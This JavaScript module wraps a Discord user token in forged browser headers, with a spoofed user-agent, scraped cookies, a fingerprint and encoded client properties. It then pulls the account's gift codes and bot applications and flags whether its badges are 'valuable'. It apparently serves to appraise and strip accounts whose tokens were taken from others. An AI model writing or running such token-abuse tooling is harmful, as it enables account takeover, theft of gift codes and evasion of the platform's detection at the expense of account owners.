const fetch = require("node-fetch");

const SelfUser = require("./SelfUser.js"); /* user itself */
const Gift = require("./Gift.js");
const Application = require("./Application.js");
module.exports = class {
	
	#token = null;
	#headers = null;
	#user = null;

	get User() { return this.#user }

	get Application() { 
		var newApplication = new Application();
	 	newApplication.get(this.#headers, {});
		return newApplication;
	}

	constructor(token)
	{
		this.#token = token;
		this.#user = null;
	}

	async Initialise() {
		this.#headers = await this.getHeaders(this.#token);
		this.#user = await SelfUser.get(this.#headers);
	}

	async getHeaders(token)
	{
		var cookie = await this.getCookies();
		var fingerPrint = await this.getFingerPrint();
		var superProperties = await this.getSuperProperties();
		var headers = {
			'authority': 'discord.com',
			'method': 'POST',
			'path': '/api/v9/users/@me',
			'scheme': 'https',
			'accept': '*/*',
			'accept-encoding': 'gzip, deflate',
			'accept-language': 'en-US',
			'authorization': token,
			'cookie': `__dcfduid=${await cookie.dcf}; __sdcfduid=${await cookie.sdc}`,
			'origin': 'https://discord.com',
			'sec-ch-ua': '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'empty',
			'sec-fetch-mode': 'cors',
			'sec-fetch-site': 'same-origin',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
			'x-debug-options': 'bugReporterEnabled',
			'x-fingerprint': await fingerPrint,
			'x-super-properties': await superProperties,
		}
		return await headers;
	}

	async getBots()
	{
		var allBots = [];
		try {
			var bots = await fetch("https://discord.com/api/v9/applications?with_team_applications=true", { headers: this.#headers });
			var botsJson = await bots.json();
			return await botsJson;
		} catch {
			return await this.getBots();
		}
	}

	async getGiftCodes()
	{
		try {
			var gifts = [];
			var request = await fetch(`https://discord.com/api/v9/users/@me/entitlements/gifts`, { headers: this.#headers });
			var requestJson = await request.json();
			if (await requestJson.message) return await requestJson;

			for (var gift of await requestJson)
			{
				var newGift = new Gift();
				await newGift.get(this.#headers, await gift);
				gifts.push(await newGift)
			}
			return await gifts;
		} catch (ex) {
			console.log(ex);
			return await this.getGiftCodes()

		}
	}

	async getCookies()
	{
		var request = await fetch("https://discord.com/");
		var cookies = await request.headers.get('set-cookie');
		return {
			dcf: await cookies.split('__dcfduid=')[1].split(' ')[0],
			sdc: await cookies.split('__sdcfduid=')[1].split(' ')[0]
		}
	}

	async getFingerPrint()
	{
		var request = await fetch("https://discord.com/api/v9/experiments");
		var requestJson = await request.json();
		return await requestJson.fingerprint;
	}

	async getSuperProperties()
	{
		var properties = '{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-GB","browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36","browser_version":"95.0.4638.54","os_version":"10","referrer":"","referring_domain":"","referrer_current":"","referring_domain_current":"","release_channel":"stable","client_build_number":102113,"client_event_source":null}';
		var b64Properties = Buffer.from(properties).toString('base64');
		return b64Properties;
	}

	convertFlagsToBadges(flags)
	{
		var Discord_Employee = 1;
		var Partnered_Server_Owner = 2;
		var HypeSquad_Events = 4;
		var Bug_Hunter_Level_1 = 8;
		var House_Bravery = 64;
		var House_Brilliance = 128;
		var House_Balance = 256;
		var Early_Supporter = 512;
		var Bug_Hunter_Level_2 = 16384;
		var Early_Verified_Bot_Developer = 131072;

		var badges = [];
		var badgeValuable = false;

		if((flags & Discord_Employee) == Discord_Employee) {
			badges.push("STAFF DISCORD");
			badgeValuable = true
		}
		if((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
			badges.push("PARTNER DISCORD");
			badgeValuable = true
		}
		if((flags & HypeSquad_Events) == HypeSquad_Events) {
			badges.push("HYPESQUAD EVENT");
			badgeValuable = true
		}
		if((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
			badges.push("BUG HUNTER (1)");
			badgeValuable = true
		}
		if((flags & Early_Supporter) == Early_Supporter) {
			badges.push("EARLY");
			badgeValuable = true
		}
		if((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
			badges.push("BUG HUNTER (2)");
			badgeValuable = true
		}
		if((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer ) {
			badges.push("DEVELOPER");
			badgeValuable = true
		}
		return {
			badges: badges,
			valuable: badgeValuable
		}
	}
}

function sleep(ms) { return new Promise((resolve) => { setTimeout(resolve, ms);  }); }